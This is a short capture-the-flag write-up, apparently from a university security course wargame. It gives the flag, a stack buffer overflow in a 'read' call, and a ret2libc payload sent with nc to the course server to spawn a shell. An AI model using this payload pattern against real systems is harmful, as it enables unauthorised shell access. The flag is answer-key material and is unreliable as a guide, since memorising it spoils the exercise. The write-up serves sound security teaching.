Flag: `6447{1feda6d2-8033-4c40-86cb-f46c2ad98888}`

General overview of problems faced
-------------------------------------
I was using wrong address to point to bin/bash

List of vulnerabilities
--------------------
1. The program uses a `read` function call and allows up to 256 bytes to be written but the buffer being written to is less than 256 therefore the buffer can be overflown. We can use ret to libc to get a shell

Steps to exploit
------------------
1. Send 140 bytes of padding + address to `call system` in little endian format ("\x90\x83\x04\x08") + a fake return address + the address to bin/bash ("\x00\x86\x04\x08")


Script/Command used
------------------
```bash
(python -c 'print "A"*140 + "\x90\x83\x04\x08" + "BBBB" + "\x00\x86\x04\x08"'; cat - ) | nc wargames.6447.sec.edu.au 8003
```
